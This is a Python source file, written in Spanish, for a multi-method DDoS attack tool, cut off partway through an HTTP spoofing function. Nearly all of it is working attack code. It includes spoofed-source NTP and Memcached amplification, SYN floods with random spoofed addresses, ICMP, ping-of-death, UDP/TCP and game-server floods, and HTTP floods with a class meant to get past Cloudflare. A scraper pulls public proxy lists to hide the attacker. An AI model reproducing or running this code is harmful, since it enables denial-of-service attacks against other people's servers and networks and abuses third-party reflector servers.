#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket, threading, time, random, cloudscraper, requests, struct, os, sys, socks, ssl
from struct import pack as data_pack
from multiprocessing import Process
from urllib.parse import urlparse
from scapy.all import IP, UDP, Raw, ICMP, send
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from typing import Any, List, Set, Tuple
from uuid import UUID, uuid4
from icmplib import ping as pig
from scapy.layers.inet import UDP
import argparse
import ipaddress
import re
import aiohttp
import asyncio
from typing import List, Tuple, Optional
import random
import socket
import ssl
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from urllib.parse import urlparse

import requests
from colorama import Fore, init
from fake_useragent import UserAgent
from src.Commands.Methods_L3.icmp import icmp
from src.Commands.Methods_L3.pod import pod
from src.Commands.Methods_L4.junk import junk
from src.Commands.Methods_L4.tcp import tcp
from src.Commands.Methods_L4.udp import udp
from src.Commands.Methods_L4.hex import hex
from src.Commands.Methods_L4.tup import tup
from src.Commands.Methods_L4.syn import syn
from src.Commands.Methods_L4.ntp import ntp
from src.Commands.Methods_L4.mem import mem
from src.Commands.Methods_L7.httpio import httpio
from src.Commands.Methods_L7.httpspoof import httpspoof
from src.Commands.Methods_L7.httpstorm import httpstorm
from src.Commands.Methods_L7.httpcfb import httpcfb
from src.Commands.Methods_L7.httpget import httpget
from src.Commands.Methods_Games.roblox import roblox
from src.Commands.Methods_Games.vse import vse
from src.Commands.Tools.url_to_ip import url_to_ip
from src.Commands.Tools.ip_to_loc import ip_to_loc

ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
REGEX = re.compile(r'(\d{1,3}(?:\.\d{1,3}){3}:\d{2,5})')


class CloudflareBypass:
    def __init__(self, target_url, threads=100, duration=60):
        self.target_url = target_url
        self.threads = threads
        self.duration = duration
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.netloc
        self.path = self.parsed_url.path or "/"
        self.is_https = self.parsed_url.scheme == "https"
        self.port = 443 if self.is_https else 80
        self.ua = UserAgent()
        self.cf_clearance = None
        self.user_agent = None
        self.cookies = {}
        self.check_cloudflare()
        self.get_cf_clearance()

    def check_cloudflare(self):
        try:
            headers = {"User-Agent": self.ua.chrome}
            response = requests.get(self.target_url, headers=headers, timeout=10)
            if "cloudflare" in response.headers.get("server", "").lower():
                print(f"{Fore.YELLOW}[!] El objetivo está protegido por Cloudflare")
                if "cf-chl-bypass" in response.text.lower():
                    print(f"{Fore.RED}[!] Cloudflare Challenge detectado")
                return True
            return False
        except Exception as e:
            print(f"{Fore.RED}[!] Error al verificar Cloudflare: {e}")
            return False

    def get_cf_clearance(self):
        print(f"{Fore.CYAN}[*] Intentando obtener cookies de bypass...")
        try:
            session = requests.Session()
            headers = {
                "User-Agent": self.ua.chrome,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
            }
            response = session.get(self.target_url, headers=headers, timeout=15)
            if "cf_clearance" in session.cookies:
                self.cf_clearance = session.cookies["cf_clearance"]
                self.user_agent = headers["User-Agent"]
                self.cookies = {
                    "cf_clearance": self.cf_clearance,
                    "__cf_bm": session.cookies.get("__cf_bm", ""),
                }
                print(f"{Fore.GREEN}[+] Cookies obtenidas con éxito!")
                print(f"{Fore.GREEN}[+] User-Agent: {self.user_agent}")
                print(f"{Fore.GREEN}[+] cf_clearance: {self.cf_clearance}")
                return True
            print(f"{Fore.RED}[-] No se pudo obtener cf_clearance")
            return False
        except Exception as e:
            print(f"{Fore.RED}[!] Error al obtener cookies: {e}")
            return False

    def create_ssl_context(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context

    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            if self.is_https:
                context = self.create_ssl_context()
                sock = context.wrap_socket(sock, server_hostname=self.host)
            sock.connect((self.host, self.port))
            return sock
        except Exception as e:
            print(f"{Fore.RED}[!] Error al crear socket: {e}")
            return None

    def generate_payload(self):
        methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS"]
        method = random.choice(methods)
        headers = {
            "Host": self.host,
            "User-Agent": self.user_agent or self.ua.chrome,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
        }
        if self.cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
            headers["Cookie"] = cookie_str
        extra_headers = {
            "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
            "X-Requested-With": "XMLHttpRequest",
            "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
            "Referer": f"https://{self.host}/",
            "Origin": f"https://{self.host}",
        }
        for _ in range(random.randint(1, 3)):
            headers.update(random.sample(extra_headers.items(), 1))
        request = f"{method} {self.path} HTTP/1.1\r\n"
        for key, value in headers.items():
            request += f"{key}: {value}\r\n"
        request += "\r\n"
        return request.encode()

    def attack(self):
        start_time = time.time()
        request_count = 0
        while time.time() - start_time < self.duration:
            try:
                sock = self.create_socket()
                if not sock:
                    continue
                payload = self.generate_payload()
                sock.sendall(payload)
                try:
                    sock.recv(1024)
                except:
                    pass
                request_count += 1
                sock.close()
            except Exception as e:
                continue
        return request_count

    def start(self):
        print(f"{Fore.CYAN}[*] Iniciando ataque a {self.target_url}")
        print(f"{Fore.CYAN}[*] Duración: {self.duration} segundos")
        print(f"{Fore.CYAN}[*] Hilos: {self.threads}")
        total_requests = 0
        start_time = time.time()
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.attack) for _ in range(self.threads)]
            for future in futures:
                total_requests += future.result()
        end_time = time.time()
        elapsed = end_time - start_time
        rps = total_requests / elapsed if elapsed > 0 else 0
        print(f"{Fore.GREEN}[+] Ataque completado!")
        print(f"{Fore.GREEN}[+] Total de solicitudes: {total_requests}")
        print(f"{Fore.GREEN}[+] Solicitudes por segundo: {rps:.2f}")

def generate_user_agent():
    bases = [
        "Mozilla/5.0 ({system}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{version} Safari/537.36",
        "Mozilla/5.0 ({system}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 ({system}; rv:{version}) Gecko/20100101 Firefox/{version}",
        "Mozilla/5.0 ({system}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36 Edg/{edge_version}",
    ]
    systems = [
        "Windows NT 10.0; Win64; x64",
        "Windows NT 6.1; WOW64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "Linux; Android 11; Pixel 5",
        "iPhone; CPU iPhone OS 16_0 like Mac OS X"
    ]
    browsers = [
        ("Chrome", list(range(80, 117))),
        ("Safari", [12, 13, 14, 15, 16]),
        ("Firefox", list(range(50, 117))),
        ("Edge", list(range(80, 116))),
    ]
    system = random.choice(systems)
    browser, versions = random.choice(browsers)
    version = random.choice(versions)
    base = random.choice(bases)
    edge_version = random.randint(80, 116)
    return base.format(system=system, browser=browser, version=version, edge_version=edge_version)

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.proxy_urls ={
        "http": [
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=",
            "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Https.txt",
            "https://raw.githubusercontent.com/MrMarble/proxy-list/main/all.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
            "https://raw.githubusercontent.com/gitrecon1455/ProxyScraper/main/proxies.txt",
            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
            "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/elliottophellia/proxylist/master/results/http/global/http_checked.txt",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://api.openproxylist.xyz/http.txt",
            "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
            "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
            "https://proxy-spider.com/api/proxies.example.txt",
            "https://proxyspace.pro/http.txt",
            "https://proxyspace.pro/https.txt"
        ],
        "socks4": [
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
            "https://openproxylist.xyz/socks4.txt",
            "https://proxyspace.pro/socks4.txt",
            "https://www.proxy-list.download/api/v1/get?type=socks4",
            "https://proxyhub.me/en/all-socks4-proxy-list.html",
            "https://proxy-tools.com/proxy/socks4",
            "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks4",
            "https://spys.me/socks.txt",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
            "https://api.openproxylist.xyz/socks4.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
            "https://www.socks-proxy.net/",
            "https://cdn.jsdelivr.net/gh/B4RC0DE-TM/proxy-list/SOCKS4.txt",
            "https://cdn.jsdelivr.net/gh/jetkai/proxy-list/online-proxies/txt/proxies-socks4.txt",
            "https://cdn.jsdelivr.net/gh/roosterkid/openproxylist/SOCKS4_RAW.txt",
            "https://cdn.jsdelivr.net/gh/saschazesiger/Free-Proxies/proxies/socks4.txt",
            "https://cdn.jsdelivr.net/gh/TheSpeedX/PROXY-List/socks4.txt",
            "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks4/global/socks4_checked.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
            "https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/socks4.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
            "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks4_proxies.txt",
            "https://raw.githubusercontent.com/SevenworksDev/proxy-list/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks4.txt",
            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4/socks4.txt",
            "https://raw.githubusercontent.com/Tsprnay/Proxy-lists/master/proxies/socks4.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
            "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt"
        ],
        "socks5": [
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
            "https://openproxylist.xyz/socks5.txt",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
            "https://proxyspace.pro/socks5.txt",
            "https://spys.me/socks.txt",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://proxy-tools.com/proxy/socks5",
            "https://proxyhub.me/en/all-sock5-proxy-list.html",
            "https://www.my-proxy.com/free-socks-5-proxy.html",
            "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5",
            "https://cdn.jsdelivr.net/gh/HyperBeats/proxy-list/socks5.txt",
            "https://cdn.jsdelivr.net/gh/jetkai/proxy-list/online-proxies/txt/proxies-socks5.txt",
            "https://cdn.jsdelivr.net/gh/roosterkid/openproxylist/SOCKS5_RAW.txt",
            "https://cdn.jsdelivr.net/gh/TheSpeedX/PROXY-List/socks5.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
            "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks5/global/socks5_checked.txt",
            "https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/socks5.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
            "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/im-razvan/proxy_list/main/socks5.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/SevenworksDev/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks5.txt",
            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
            "https://raw.githubusercontent.com/Tsprnay/Proxy-lists/master/proxies/socks5.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://api.openproxylist.xyz/socks5.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
        ]
    }

    async def scrape_proxies(self, proxy_type: str) -> List[Tuple[str, str]]:
        if proxy_type not in self.proxy_urls:
            raise ValueError(f"Invalid proxy type: {proxy_type}")
        proxies = []
        async with aiohttp.ClientSession() as session:
            tasks = []
            for url in self.proxy_urls[proxy_type]:
                tasks.append(self._scrape_url(session, url, proxy_type))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, list):
                    proxies.extend(result)
        proxies = list(set(proxies))
        self.proxies = proxies
        return proxies

    async def _scrape_url(self, session: aiohttp.ClientSession, url: str, proxy_type: str) -> List[Tuple[str, str]]:
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                text = await resp.text()
                matches = REGEX.findall(text)
                return [(proxy_type, match) for match in matches]
        except Exception as e:
            print(f"Failed to scrape {url}: {str(e)}")
            return []

    async def validate_proxies(self, proxy_type: str, test_url: str = "http://www.google.com") -> List[Tuple[str, str]]:
        if not self.proxies:
            await self.scrape_proxies(proxy_type)
        valid_proxies = []
        sem = asyncio.Semaphore(200)
        async def validate(session: aiohttp.ClientSession, proxy: Tuple[str, str]) -> Optional[Tuple[str, str]]:
            ptype, addr = proxy
            async with sem:
                try:
                    async with session.get(test_url, proxy=f"{ptype}://{addr}",
                                         timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        if resp.status == 200:
                            return proxy
                except:
                    return None
        async with aiohttp.ClientSession() as session:
            tasks = [validate(session, proxy) for proxy in self.proxies]
            results = await asyncio.gather(*tasks)
            valid_proxies = [result for result in results if result is not None]
        self.proxies = valid_proxies
        return valid_proxies

    def get_random_proxy(self) -> Optional[Tuple[str, str]]:
        if not self.proxies:
            return None
        return random.choice(self.proxies)

    def save_proxies(self, filename: str):
        with open(filename, 'w') as f:
            for ptype, addr in self.proxies:
                f.write(f"{ptype}://{addr}\n")

    def load_proxies(self, filename: str):
        self.proxies = []
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    if line.startswith("http://"):
                        self.proxies.append(("http", line[7:]))
                    elif line.startswith("socks4://"):
                        self.proxies.append(("socks4", line[9:]))
                    elif line.startswith("socks5://"):
                        self.proxies.append(("socks5", line[9:]))
        except FileNotFoundError:
            pass

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        # Puedes agregar verificación de IP privada si es necesario
        # if ipaddress.ip_address(ip).is_private:
        #     raise ValueError("IP privada no permitida")
        return True
    except ValueError:
        return False

def validate_port(port):
    return isinstance(port, int) and 1 <= port <= 65535

def validate_time(secs):
    return isinstance(secs, int) and 10 <= secs <= 86400

def rand_ua():
    base_user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    ]
    return random.choice(base_user_agents)

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assembled

def NTP(target, port, timer):
    try:
        with open("ntpServers.txt", "r") as f:
            ntp_servers = [line.strip() for line in f if line.strip()]
        if not ntp_servers:
            print("Error: No se encontraron servidores NTP en ntpServers.txt")
            return
    except FileNotFoundError:
        print("Error: Archivo ntpServers.txt no encontrado.")
        return
    except Exception as e:
        print(f"Error al leer ntpServers.txt: {e}")
        return
    server = random.choice(ntp_servers)
    print(f"[NTP] Iniciando ataque contra {target}:{port} usando servidor NTP {server} por {timer} segundos")
    end_time = time.time() + timer
    while time.time() < end_time:
        try:
            packet = (
                    IP(dst=server, src=target) /
                    UDP(sport=random.randint(1024, 65535), dport=int(port)) /
                    Raw(load=ntp_payload)
            )
            send(packet, count=10, verbose=False)
        except Exception as e:
            print(f"[NTP] Error enviando paquete: {e}")
    print(f"[NTP] Ataque contra {target}:{port} finalizado.")

def MEM(target, port, timer):
    try:
        with open("memsv.txt", "r") as f:
            mem_servers = [line.strip() for line in f if line.strip()]
        if not mem_servers:
            print("Error: No se encontraron servidores Memcached en memsv.txt")
            return
    except FileNotFoundError:
        print("Error: Archivo memsv.txt no encontrado.")
        return
    except Exception as e:
        print(f"Error al leer memsv.txt: {e}")
        return
    server = random.choice(mem_servers)
    print(f"[MEM] Iniciando ataque contra {target}:{port} usando servidor Memcached {server} por {timer} segundos")
    end_time = time.time() + timer
    while time.time() < end_time:
        try:
            packet = (
                    IP(dst=server, src=target) /
                    UDP(sport=port, dport=11211) /
                    Raw(load=mem_payload)
            )
            send(packet, count=10, verbose=False)
        except Exception as e:
            print(f"[MEM] Error enviando paquete: {e}")
    print(f"[MEM] Ataque contra {target}:{port} finalizado.")

def icmp_flood(target, timer):
    print(f"[ICMP] Iniciando ataque contra {target} por {timer} segundos")
    end_time = time.time() + timer
    while time.time() < end_time:
        try:
            packet_data = random._urandom(random.randint(64, 1024))
            pig(target, count=10, interval=0.0, payload_size=len(packet_data), payload=packet_data)
        except Exception as e:
            print(f"[ICMP] Error enviando paquete: {e}")
    print(f"[ICMP] Ataque contra {target} finalizado.")

def pod(target, timer):
    print(f"[POD] Iniciando ataque contra {target} por {timer} segundos")
    end_time = time.time() + timer
    while time.time() < end_time:
        try:
            rand_addr = spoofer()
            ip_hdr = IP(src=rand_addr, dst=target)
            packet = ip_hdr / ICMP() / ("m" * 65000)
            send(packet, verbose=False)
        except Exception as e:
            print(f"[POD] Error enviando paquete: {e}")
    print(f"[POD] Ataque contra {target} finalizado.")

def attack_udp(ip, port, secs, size):
    print(f"[UDP] Iniciando ataque contra {ip}:{port} por {secs} segundos, tamaño={size}")
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            data = random._urandom(size)
            s.sendto(data, (ip, dport))
            s.close()
        except Exception as e:
            print(f"[UDP] Error enviando paquete: {e}")
    print(f"[UDP] Ataque contra {ip}:{port} finalizado.")

def attack_tcp(ip, port, secs, size):
    print(f"[TCP] Iniciando ataque contra {ip}:{port} por {secs} segundos, tamaño={size}")
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            while time.time() < end_time:
                s.send(random._urandom(size))
            s.close()
        except Exception as e:
            try:
                s.close()
            except:
                pass
    print(f"[TCP] Ataque contra {ip}:{port} finalizado.")

def attack_SYN(ip, port, secs):
    print(f"[SYN] Iniciando ataque contra {ip}:{port} por {secs} segundos")
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            ip_layer = IP(dst=ip, src=spoofer())
            tcp_layer = TCP(dport=port, sport=random.randint(1024, 65535), flags="S")
            packet = ip_layer / tcp_layer
            send(packet, verbose=False)
        except Exception as e:
            print(f"[SYN] Error enviando paquete: {e}")
    print(f"[SYN] Ataque contra {ip}:{port} finalizado.")

def attack_tup(ip, port, secs, size):
    print(f"[TUP] Iniciando ataque contra {ip}:{port} por {secs} segundos, tamaño={size}")
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport_udp = random.randint(1, 65535) if port == 0 else port
            data = random._urandom(size)
            udp_sock.sendto(data, (ip, dport_udp))
            udp_sock.close()
            tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_sock.settimeout(1)
            tcp_sock.connect((ip, port))
            tcp_sock.send(data)
            tcp_sock.close()
        except Exception as e:
            try:
                udp_sock.close()
            except: pass
            try:
                tcp_sock.close()
            except: pass
    print(f"[TUP] Ataque contra {ip}:{port} finalizado.")

def attack_hex(ip, port, secs):
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    print(f"[HEX] Iniciando ataque contra {ip}:{port} por {secs} segundos")
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.close()
        except Exception as e:
            print(f"[HEX] Error enviando paquete: {e}")
    print(f"[HEX] Ataque contra {ip}:{port} finalizado.")

def attack_vse(ip, port, secs):
    payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                b'\x20\x51\x75\x65\x72\x79\x00')
    print(f"[VSE] Iniciando ataque contra {ip}:{port} por {secs} segundos")
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.close()
        except Exception as e:
            print(f"[VSE] Error enviando paquete: {e}")
    print(f"[VSE] Ataque contra {ip}:{port} finalizado.")

def attack_roblox(ip, port, secs, size):
    print(f"[ROBLOX] Iniciando ataque contra {ip}:{port} por {secs} segundos, tamaño={size}")
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_data = random._urandom(size)
            dport = random.randint(1, 65535) if port == 0 else port
            ran = random.randrange(10**80)
            hex_str = "%064x" % ran
            hex_str = hex_str[:64]
            s.sendto(bytes.fromhex(hex_str) + bytes_data, (ip, dport))
            s.close()
        except Exception as e:
            print(f"[ROBLOX] Error enviando paquete: {e}")
    print(f"[ROBLOX] Ataque contra {ip}:{port} finalizado.")

def attack_junk(ip, port, secs):
    """Ataque Junk Flood"""
    payload = b'\x00' * 1024
    print(f"[JUNK] Iniciando ataque contra {ip}:{port} por {secs} segundos")
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.close()
        except Exception as e:
            print(f"[JUNK] Error enviando paquete: {e}")
    print(f"[JUNK] Ataque contra {ip}:{port} finalizado.")

def STORM_attack(url, port, secs):
    target_url = f"{url}:{port}" if port else url
    print(f"[HTTPSTORM] Iniciando ataque contra {target_url} por {secs} segundos")
    end_time = time.time() + secs
    scraper = cloudscraper.create_scraper()
    s = requests.Session()
    while time.time() < end_time:
        try:
            headers = {'User-Agent': rand_ua()}
            requests.get(target_url, headers=headers)
            requests.head(target_url, headers=headers)
            scraper.get(target_url, headers=headers)
        except Exception as e:
            print(f"[HTTPSTORM] Error: {e}")
    print(f"[HTTPSTORM] Ataque contra {target_url} finalizado.")

def GET_attack(url, port, secs):
    target_url = f"{url}:{port}" if port else url
    print(f"[HTTPGET] Iniciando ataque contra {target_url} por {secs} segundos")
    end_time = time.time() + secs
    scraper = cloudscraper.create_scraper()
    s = requests.Session()
    while time.time() < end_time:
        try:
            headers = {'User-Agent': rand_ua()}
            requests.get(target_url, headers=headers)
            scraper.get(target_url, headers=headers)
        except Exception as e:
            print(f"[HTTPGET] Error: {e}")
    print(f"[HTTPGET] Ataque contra {target_url} finalizado.")

def httpio(target, times, threads, attack_type):
    print(f"[HTTPIO] Iniciando ataque contra {target} por {times} segundos, hilos={threads}, tipo={attack_type}")
    proxies = []
    cfbp = 0
    if attack_type.lower() in ['proxy', 'normal']:
        try:
            # Intentar obtener proxies (puedes agregar más fuentes)
            # proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            # proxies = proxyscrape_http.text.replace('\r', '').split('\n')
            # proxies = [p for p in proxies if p] # Eliminar entradas vacías
            print("[HTTPIO] Usando modo sin proxy.")
        except:
            print("[HTTPIO] Error al obtener proxies, usando sin proxy.")
            proxies = []
    else:
        print("[HTTPIO] Usando modo sin proxy.")
    def run(target, proxies, cfbp):
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        try:
            scraper.get(target, headers=headers, timeout=15)
        except:
            pass
    def thread(target, proxies, cfbp):
        end_time = time.time() + times
        while time.time() < end_time:
            run(target, proxies, cfbp)
            time.sleep(0.1)
    processes = []
    for _ in range(threads):
        p = threading.Thread(target=thread, args=(target, proxies, cfbp))
        processes.append(p)
        p.start()
    time.sleep(times)
    for p in processes:
        p.join(timeout=1)
        if p.is_alive():
            print(f"[HTTPIO] Hilo {p.ident} aún activo.")
    print(f"[HTTPIO] Ataque contra {target} finalizado.")

proxy_manager = ProxyManager()

async def initialize_proxies(proxy_type: str = "socks4", manager: ProxyManager = None):
    """Initialize proxies using a specific manager instance."""
    if manager is None:
        manager = ProxyManager() 

    try:
        manager.load_proxies(f"{proxy_type}_proxies.txt") 
        if not manager.proxies:
            await manager.scrape_proxies(proxy_type)
            await manager.validate_proxies(proxy_type)
            manager.save_proxies(f"{proxy_type}_proxies.txt")
    except Exception as e:
        print(f"Proxy initialization failed: {e}")

def httpSpoofAttack(url, timer):
    print(f"[HTTPSPOOF] Iniciando ataque contra {url} por {timer} segundos")
    timeout = time.time() + int(timer)
    proxies = proxy_manager.proxies
    if not proxies:
        print("[HTTPSPOOF] No hay proxies disponibles, usando conexión directa")
    req = "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "User-Agent: " + generate_user_agent() + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += "Accept-Language: en-US,en;q=0.5\r\n"
    req += "Accept-Encoding: gzip, deflate\r\n"
    req += "Connection: keep-alive\r\n\r\n"
    while time.time() < timeout:
        try:
            if proxies:
                proxy = random.choice(proxies)
                ptype, paddr = proxy
                proxy_ip, proxy_port = paddr.split(":")
                s = socks.socksocket()
                if ptype == "socks4":
                    s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
                elif ptype == "socks5":
                    s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
                else:  # http
                    s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((str(urlparse(url).netloc), 80))
            for _ in range(10):
